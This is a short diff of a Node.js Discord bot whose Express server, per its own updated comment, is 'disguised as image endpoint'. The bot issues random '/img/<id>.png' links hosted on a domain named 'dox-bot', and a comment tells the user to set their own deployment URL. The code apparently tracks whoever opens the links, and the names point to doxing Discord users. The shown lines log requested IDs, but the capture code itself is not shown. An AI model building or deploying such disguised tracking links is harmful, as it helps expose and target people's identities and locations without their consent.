@@ -19,7 +19,7 @@ const client = new Client({
 // ---- STORE ACTIVE LINKS ----
 const links = new Map();
 
-// ---- EXPRESS SERVER WITH DEBUG LOGGING ----
+// ---- EXPRESS SERVER (disguised as image endpoint) ----
 app.get('/img/:id.png', (req, res) => {
     const id = req.params.id;
     console.log(`🔍 Requested ID: ${id}`);
@@ -57,7 +57,8 @@ client.on('interactionCreate', async (interaction) => {
         await interaction.deferReply({ ephemeral: true });
 
         const id = crypto.randomBytes(6).toString('hex');
-        const url = `https://pulsebot.onrender.com/img/${id}.png`;
+        // ---- CHANGE THIS URL TO YOUR ACTUAL RENDER URL ----
+        const url = `https://dox-bot-43ij.onrender.com/img/${id}.png`;
 
         links.set(id, {
             created: Date.now(),
